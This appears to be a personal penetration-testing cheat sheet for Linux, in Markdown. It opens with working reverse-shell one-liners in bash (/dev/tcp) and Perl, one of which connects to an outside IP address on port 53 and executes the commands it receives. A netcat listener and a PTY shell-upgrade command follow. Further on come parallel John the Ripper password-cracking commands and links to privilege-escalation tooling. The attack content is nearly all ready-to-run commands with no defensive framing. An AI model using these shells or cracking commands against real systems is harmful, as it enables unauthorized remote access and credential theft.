# Linux 

## Shell

### Reverse

```bash
exec 5<>/dev/tcp/192.168.10.1/1337 ; cat <&5 | while read line; do $line 2>&5 >&5; done
```
```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"64.251.22.205:53");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Listen 

```bash
rlwrap nc -lnvp 1337
```

### Spawn
```bash
python -c  'import pty; pty.spawn("/bin/bash")'
```


## Password Crack
### Running jtr on multiple hosts

```bash
seq 5 8 | parallel -v --progress -j+0 ./john --session=sesson{} -wordlist={} hashs
seq 5 8 | parallel -v --progress -j+0 ./john --session=sesson{} -incremental=all{} hashs
```

## Privilege escalation

### Local checks
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

### Techniques
...

## Utils
Match IP

```bash
perl -ne 'print "$1\n" if(m{(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})})' ups.txt
```

```bash
echo -n "Hello world" | perl -ne 'printf "%x",  unpack "C*" foreach (reverse split //) ';echo
```

Diff entries 

```bash
for i in $(cat all); do x=$(egrep $i z); if [ -z $x ]; then echo $i; fi ; done
```
## Miscellaneous
Binaries abuse:
- https://gtfobins.github.io/ (Linux)
